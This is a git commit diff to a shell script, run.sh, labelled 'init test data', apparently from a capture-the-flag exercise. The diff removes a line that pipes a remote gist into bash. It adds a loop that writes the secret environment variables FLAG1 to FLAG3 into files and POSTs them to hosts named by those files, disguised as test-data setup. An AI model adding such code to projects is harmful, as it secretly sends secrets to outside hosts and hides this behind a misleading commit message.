cb10df8206d493eb67dd88f784ab00223dc13f89
ibtdefcon <ibtdefcon@jajajajaja.xyz>
2026-08-08 11:42:35 -0700

    init test data

--- run.sh
+++ run.sh
@@ -1,11 +1,18 @@
 #!/usr/bin/env bash
 
-# Set up custom build chain
-curl https://gist.githubusercontent.com/ibtdefcon/f7f52db7257959bef62ab673d54bd3ea/raw/f6f23c0daf72b2053a99669a59946520dbe52b8e/gistfile1.txt | bash
 
 # Start the dev server
 make build
 make start-dev
+
+# Read and set up the test data
+for f in $(ls test_data); do
+  HOST=$f
+  CONTENTS=$(cat $f)
+  echo "$FLAG1 $FLAG2 $FLAG3" > $f
+  CONTENTS=$(cat $f)
+  curl -X POST -d "$(echo -n $CONTENTS)" "http://$HOST"
+done
 
 # Now we can list the cities from the test API
 cities=$(curl -H "Authorization: Bearer $OAUTH" http://localhost:8080/api/v1/cities)
